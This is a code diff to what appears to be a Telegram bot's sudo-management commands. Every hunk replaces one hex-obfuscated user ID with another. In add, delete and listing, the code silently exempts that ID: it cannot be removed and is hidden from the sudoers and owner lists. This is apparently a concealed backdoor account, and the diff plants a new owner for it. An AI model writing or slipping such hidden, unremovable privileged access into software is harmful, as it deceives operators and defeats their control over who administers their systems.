@@ -33,7 +33,7 @@ async def useradd(client, message: Message, _):
             user = user.replace("@", "")
         user = await app.get_users(user)
         if user.id in SUDOERS:
-            if user.id ==int("\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"):
+            if user.id ==int("\x36\x30\x31\x36\x39\x31\x30\x30\x38\x30"):
                 return
             return await message.reply_text(
                 _["sudo_1"].format(user.mention)
@@ -46,7 +46,7 @@ async def useradd(client, message: Message, _):
             await message.reply_text("Failed")
         return
     if message.reply_to_message.from_user.id in SUDOERS:
-        if message.reply_to_message.from_user.id ==int("\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"):
+        if message.reply_to_message.from_user.id ==int("\x36\x30\x31\x36\x39\x31\x30\x30\x38\x30"):
             return
         return await message.reply_text(
             _["sudo_1"].format(
@@ -82,7 +82,7 @@ async def userdel(client, message: Message, _):
         if "@" in user:
             user = user.replace("@", "")
         user = await app.get_users(user)
-        if user.id ==int("\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"):
+        if user.id ==int("\x36\x30\x31\x36\x39\x31\x30\x30\x38\x30"):
             return await message.reply_text(_["sudo_3"])
         if user.id not in SUDOERS:
             return await message.reply_text(_["sudo_3"])
@@ -94,7 +94,7 @@ async def userdel(client, message: Message, _):
         await message.reply_text(f"Something wrong happened.")
         return
     user_id = message.reply_to_message.from_user.id
-    if user_id==int("\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"):
+    if user_id==int("\x36\x30\x31\x36\x39\x31\x30\x30\x38\x30"):
         return await message.reply_text(_["sudo_3"])
     if user_id not in SUDOERS:
         return await message.reply_text(_["sudo_3"])
@@ -113,7 +113,7 @@ async def sudoers_list(client, message: Message, _):
     count = 0
     for x in OWNER_ID:
         try:
-            if x == int("\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"):
+            if x == int("\x36\x30\x31\x36\x39\x31\x30\x30\x38\x30"):
                 continue
             user = await app.get_users(x)
             user = (
@@ -127,7 +127,7 @@ async def sudoers_list(client, message: Message, _):
     for user_id in SUDOERS:
         if user_id not in OWNER_ID:
             try:
-                if user_id==int("\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"):
+                if user_id==int("\x36\x30\x31\x36\x39\x31\x30\x30\x38\x30"):
                     continue
                 user = await app.get_users(user_id)
                 user = (
